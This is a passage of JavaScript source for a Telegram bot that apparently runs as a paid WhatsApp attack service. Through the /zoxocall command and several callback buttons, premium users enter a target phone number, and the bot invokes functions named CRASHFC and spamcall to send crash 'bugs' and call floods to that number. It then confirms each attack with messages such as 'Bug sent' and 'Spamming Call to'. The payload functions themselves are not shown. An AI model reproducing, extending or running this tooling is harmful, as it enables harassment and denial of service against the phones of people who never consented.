bot.sendVideo(chatId, "https://d.top4top.io/m_3285mchc71.mp4", {
caption: "Silahkan Pilih Type Bug.",
...options,
});
});
bot.onText(/\/zoxocall(?:\s(.+))?/, async (msg, match) => {
const senderId = msg.from.id;
const chatId = msg.chat.id;
if (!whatsappStatus) {
return bot.sendMessage(chatId, "WhatsApp Is Not Connected");
}
if (!premiumUsers.includes(senderId)) {
return bot.sendMessage(chatId, "You Doesn't HAve Access To This Command");
}


const lastUsed = cooldowns.get(senderId);
const now = Date.now();
if (lastUsed && now - lastUsed < 1 * 1000) {
const remainingTime = Math.ceil((1 * 1000 - (now - lastUsed)) / 1000);
return bot.sendMessage(chatId, `❌ You must wait ${remainingTime} seconds before using this command again.`);
}
cooldowns.set(senderId, now);

if (!match[1]) {
return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number. Example: /zoxocall +628xxxx.");
}

const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
if (!/^\d+$/.test(numberTarget)) {
return bot.sendMessage(chatId, "❌ Invalid input. Example: /zoxocall +628xxxx.");
}

const formatedNumber = numberTarget + "@s.whatsapp.net"
await spamcall(formatedNumber);
await bot.sendMessage(chatId, `Bug Sended To ${numberTarget} Using zoxobug`)

});
bot.on("callback_query", async (callbackQuery) => {
const chatId = callbackQuery.message.chat.id;
const [action, formatedNumber] = callbackQuery.data.split(':');

try {
if (action === "xtroveui") {
await CRASHFC(formatedNumber);
await bot.sendMessage(chatId, `✅ Bug sent to ${formatedNumber} using zoxxo.`);
} else if (action === "trash") {
await CRASHFC(formatedNumber);
await bot.sendMessage(chatId, `✅ Bug sent to ${formatedNumber} using trash.`);
} else if (action === "xtrovebug") {
await CRASHFC(formatedNumber);
await bot.sendMessage(chatId, `✅ Bug sent to ${formatedNumber} using zoxobug.`);
} else if (action === "hit") {
await CRASHFC(formatedNumber);
await bot.sendMessage(chatId, `✅ Bug sent to ${formatedNumber} using hit.`);
} else if (action === "trovetrash") {
await CRASHFC(formatedNumber);
await bot.sendMessage(chatId, `✅ Bug sent to ${formatedNumber} using trashzoxx.`);
} else if (action === "xtrovecall") {
await spamcall(formatedNumber);
await bot.sendMessage(chatId, `✅ Spamming Call to ${formatedNumber}.`);
} else {
bot.sendMessage(chatId, "❌ Unknown action.");
}
} catch (err) {
bot.sendMessage(chatId, `❌ Failed to send bug: ${err.message}`);
}
});

startWhatsapp()
